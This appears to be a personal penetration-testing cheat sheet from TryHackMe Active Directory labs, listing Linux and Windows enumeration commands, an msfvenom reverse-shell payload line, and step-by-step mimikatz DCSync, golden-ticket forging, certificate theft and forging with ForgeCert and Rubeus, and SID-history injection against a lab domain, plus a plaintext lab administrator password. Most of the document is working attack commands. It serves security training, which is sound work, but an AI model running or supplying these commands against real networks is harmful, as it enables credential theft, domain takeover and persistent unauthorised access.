# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
- nmap Scrips
  - locate -r nse$ | grep mysql = nmap script

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null 
- psexec.py
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
  
- Shell stabilize
  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - export TERM=xterm

## Payloads
- msfvenom - reverse -f aspx -o app.aspx

## Windows
- /priv
- systeminfo
- smb read/write
- browser cache
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%


# Exploring AD
resolv.conf
search lan za.tryhackme.loc
nameserver 10.200.77.101
nameserver 10.0.0.1
options timeout:1
options attempts:2
sudo systemctl restart networking.service
dig thmdc.za.tryhackme.loc
nslookup google.com

**SSH**: ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc
Y2VgRWWiQ

Administrator:tryhackmewouldnotguess1@

# 2
```
# Dsycn
mimikatz.exe

lsadump::dcsync /domain:za.tryhackme.loc /user:aaron.jones

log username_dcdump.txt
lsadump:dcsync /domain:za.tryhackme.loc
lsadump::dcsync /domain:za.tryhackme.loc /all
```

# 3
```
# Generate Golden/Silver Ticket

NTL hash : krbtgt

hash:THMSERVER1

# SID
Get-ADDomain ==> SID
kerberis::golden /admin:NotAccount /domain:za.tryhackme.loc /id:500 /sid:SID /krbtgt:HASH /endin:600 /renewmax:10080 /ptt

```

# 4
 - Login to admin
 - mimikatz
```
crypto::certificates /systemstore:loca_machine

privilege::debug
crypto::capi
crypto::cng
crypto:.certificates /systemstore:local_machine /export

.pfx
password:mimikatz

Copy to low pivleged user
- We have Private_KEY + Root Certificate

# generate certificate
ForgeCert.exe --CaCertPath file.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath  fullAdmin.pfx --NewCertPassword Password123

# request TGT
Rubeus.exe asktgt /user:Administtrator /enctype:aes256 /certificate:file.pfx /password:Password123 /outfile:file.kirbi /domain:za.tryhackme.loc /dc:IPDOMAIn

# load ticket
kerberos::ptt file.kirbi
```

# 5

```
# check sid info
Get-ADUser NAME -properties sidhistory,memberof

# get sid admin
get-ADgroup "Domain Admins"

Stop-service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'low user' -SidHistory 'Sid to add' -DatabasePath
Start-service -Name ntds

# Login LOW user
# check sid history
dir \\thmdc.za.tryhackme.loc\c$
```